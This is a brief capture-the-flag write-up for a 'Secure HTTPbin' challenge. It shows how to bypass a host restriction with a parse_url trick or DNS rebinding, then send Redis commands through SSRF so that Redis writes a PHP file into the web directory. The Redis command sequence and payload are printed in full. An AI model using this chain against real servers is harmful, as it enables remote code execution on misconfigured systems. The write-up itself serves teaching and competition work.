# Secure HTTPbin write-up

TL;DR: Use Redis instance avaialble at 127.0.0.1 to write a php file.

1. Host restriction bypass:
  - either using parse_url bypass `http://foo@your-domain.com:80@google.com/` published by Orange Tsai at Blackhat
  - either using DNS rebinding (see dns.js)
2. Perform a POST request with Redis commands in post body:
  ```
    'CONFIG SET dir /var/www/sandbox',
    "CONFIG SET dbfilename {$file}",
    'SET x \'<?php echo "\n" . (1338-1) . "\n"; unlink(__FILE__); ?>\'',
    'SAVE',
    'DEL x',
    "CONFIG SET dir /var/lib/redis",
    "CONFIG SET dbfilename dump.rdb",
  ```

  Lines 1-4: set directory and filename, inject payload, write file
  Lines 5-7: reset everything to remove our payload from being visible by others*

* There was also a cron job running every minute that was cleaning this up.
